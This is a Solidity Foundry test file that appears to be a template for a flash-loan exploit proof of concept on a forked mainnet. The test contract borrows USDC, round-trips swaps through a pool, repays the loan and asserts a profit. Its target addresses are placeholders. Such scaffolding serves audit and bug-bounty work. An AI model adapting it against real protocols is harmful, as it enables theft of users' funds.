// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test} from "forge-std/Test.sol";
import {IERC20} from "src/interfaces/IERC20.sol";
import {IPool} from "src/interfaces/IPool.sol";
import {ILender} from "src/interfaces/ILender.sol";

/// The shape of a sound fork PoC: pinned block, the test contract as an
/// unprivileged attacker, capital from a flash loan, profit as a difference.
contract FlashLoanForkTest is Test {
    IERC20 constant USDC = IERC20(0x00000000000000000000000000000000000000C3);
    IPool constant POOL = IPool(0x00000000000000000000000000000000000000A1);
    ILender constant LENDER = ILender(0x00000000000000000000000000000000000000B2);
    address constant WHALE = 0x00000000000000000000000000000000000000D4;

    function setUp() public {
        vm.createSelectFork("mainnet", 19_000_000);
        // Gas money and a small float, taken from a real holder.
        vm.prank(WHALE);
        USDC.transfer(address(this), 1_000e6);
    }

    function test_exploit() public {
        uint256 before = USDC.balanceOf(address(this));
        LENDER.flashLoan(address(this), address(USDC), 5_000_000e6, "");
        uint256 profit = USDC.balanceOf(address(this)) - before;
        emit log_named_decimal_uint("profit", profit, 6);
        assertGt(profit, 100_000e6);
    }

    function onFlashLoan(address, address, uint256 amount, uint256 fee, bytes calldata) external returns (bytes32) {
        USDC.approve(address(POOL), amount);
        POOL.swap(address(this), true, amount);
        POOL.swap(address(this), false, USDC.balanceOf(address(this)));
        USDC.approve(address(LENDER), amount + fee);
        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }
}
